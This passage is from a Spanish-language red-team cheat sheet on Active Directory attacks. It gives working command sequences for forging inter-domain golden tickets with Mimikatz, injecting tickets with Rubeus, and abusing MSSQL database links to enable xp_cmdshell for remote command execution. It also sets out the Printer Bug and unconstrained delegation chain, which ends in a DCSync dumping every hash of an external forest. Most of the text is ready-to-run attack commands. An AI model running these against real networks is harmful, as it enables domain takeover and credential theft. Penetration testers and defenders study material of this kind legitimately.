Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<NuestroDominio> /sid:<SIDdeNuestroDominio> /rc4:<TrustKey> /service:krbtgt /target:<DominioDestino> /ticket:<RutaParaGuardar.kirbi>"'
```

📁 **Nota:** el ticket se guarda en formato `.kirbi`

- Usando Rubeus:

```powershell
#Usar el ticket forjado para pedir un TGS contra un servicio del dominio externo
.\Rubeus.exe asktgs /ticket:<ArchivoKirbi> /service:"SPN_del_Servicio" /ptt
```

✅ Una vez inyectado, puedes acceder al servicio remoto (por ejemplo, CIFS, HTTP, LDAP...) si tienes permisos asignados.

##### Abuse MSSQL Servers

**¿Qué es esto?**  
Los servidores MSSQL mal configurados pueden ser una vía directa de escalada lateral, persistencia o incluso movimiento entre bosques. Se pueden enumerar, verificar acceso, extraer información sensible y, si existen **enlaces entre bases de datos (Database Links)**, incluso pivotar entre instancias remotas.

- Enumerar instancias MSSQL en el dominio: `Get-SQLInstanceDomain`
- Comprobar accesibilidad con el usuario actual:

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Recopilar información de las instancias accesibles:

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

##### Abuso de Database Links

Los **Database Links** permiten a una instancia de SQL Server **acceder y ejecutar consultas en otra instancia remota**.  
Si conseguimos acceso a una base de datos con enlaces configurados, podemos **encadenar ejecuciones remotas**, incluso **entre dominios o bosques (Cross-Forest)**, usando procedimientos almacenados como `sp_execute`.

✅ Incluso sin privilegios elevados, si el enlace se creó con credenciales privilegiadas (ej. `sa`), podemos **ejecutar comandos como `xp_cmdshell` en la máquina remota**.

---

Enumerar Database Links existentes

```powershell
# Con PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

# Consulta manual en SQL:
select * from master..sysservers

```

---

Enumerar enlaces desde una base de datos remota enlazada

```powershell
# Consulta manual:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

# PowerUpSQL: Enumera enlaces en cadena a través de dominios y bosques
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
```

---

Habilitar RPC y RPC OUT en el enlace (necesario para ejecutar `xp_cmdshell`)

```powershell
-- Directamente desde la sesión actual
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';

-- Desde una base enlazada
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');
```

---

Ejecutar comandos en la máquina que ejecuta el servicio SQL

```powershell
-- Habilitar xp_cmdshell si está desactivado
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"

# Ejecutar comando remoto usando PowerUpSQL
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```
##### Breaking Forest Trusts (Rompimiento de Confianzas entre Bosques)

**¿Qué es esto?**  
Si tienes una **confianza bidireccional** con otro bosque de Active Directory, y comprometes **una máquina en tu dominio que tiene Unconstrained Delegation habilitada** (como un DC), puedes **forzar que el DC del bosque externo se autentique contigo** usando una técnica conocida como **Printer Bug**. Esto te permite **capturar su TGT**, inyectarlo en memoria y realizar un **DCsync**, ganando control **total sobre el bosque externo**._

**Herramientas necesarias**

- [Rubeus](https://github.com/GhostPack/Rubeus) – Para capturar e inyectar TGTs.    
- [SpoolSample](https://github.com/leechristensen/SpoolSample) – Para explotar el bug de la cola de impresión.    
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) – Para volcar hashes (DCsync).

Ejemplo de explotación

```powershell
# 1. Monitorizar TGTs de un objetivo específico
Rubeus.exe monitor /interval:5 /filteruser:target-dc

# 2. Forzar autenticación del DC del bosque externo usando el Printer Bug
SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local

# 3. Inyectar el TGT capturado (en base64) en memoria
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

# 4. Realizar DCsync y obtener todos los hashes del bosque externo
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.forest.local /all"'
```

**📚 Lecturas recomendadas**

- [Not A Security Boundary: Breaking Forest Trusts](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)    
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

